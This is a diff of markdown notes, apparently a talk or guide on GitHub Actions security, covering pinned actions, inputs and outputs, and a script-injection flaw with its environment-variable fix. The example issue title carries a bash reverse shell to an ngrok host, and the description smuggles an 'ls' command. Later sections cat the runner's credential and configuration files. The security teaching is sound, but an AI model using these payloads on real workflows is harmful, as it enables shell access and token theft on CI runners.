@@ -19,7 +19,7 @@ Gaetan
 
 ## Using versioned actions
 
-```yaml
+```yaml[]
 steps:
   # Reference a specific commit
   - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675
@@ -42,7 +42,7 @@ steps:
 
 ### Inputs
 
-```yaml
+```yaml[]
 - name: Inject slug/short variables
   uses: rlespinasse/github-slug-action@v4
   with:
@@ -52,7 +52,7 @@ steps:
 
 ### Outputs
 
-```yaml
+```yaml[]
 - name : setup node
   id: my-id
   uses: actions/setup-node@v3
@@ -118,7 +118,7 @@ Thibauld
 
 * Step of our GitHub Actions
 
-```yaml
+```yaml[]
 - run: |
     echo "ISSUE TITLE: ${{github.event.issue.title}}"
     ISSUE_DESCRIPTION="${{github.event.issue.body}}"
@@ -126,12 +126,12 @@ Thibauld
 
 * Simple issue name that trigger our Action
 
-  * Titlle : ```New title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "```
-  * Description : `a"; ls $GITHUB_WORKSPACE"`
+  * Title => ```New title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "```
+  * Description => `a"; ls $GITHUB_WORKSPACE"`
 
 * Let's fix it :
 
-```yaml
+```yaml[]
 - env:
     TITLE: ${{ github.event.pull_request.title }}
     DESCRIPTION: ${{github.event.issue.body}}
@@ -153,14 +153,14 @@ Thibauld
 
 * Credential 
 
-```yaml
+```yaml[]
 $ cat /home/runner/runners/2.287.1/.credentials
 {"data":{"token":"REDACTED"},"scheme":"OAuthAccessToken"}
 ```
 
 * Runner's data 
 
-```yaml
+```yaml[]
 $ cat /home/runner/runners/2.287.1/.runner
 {
   "AgentId": "1",
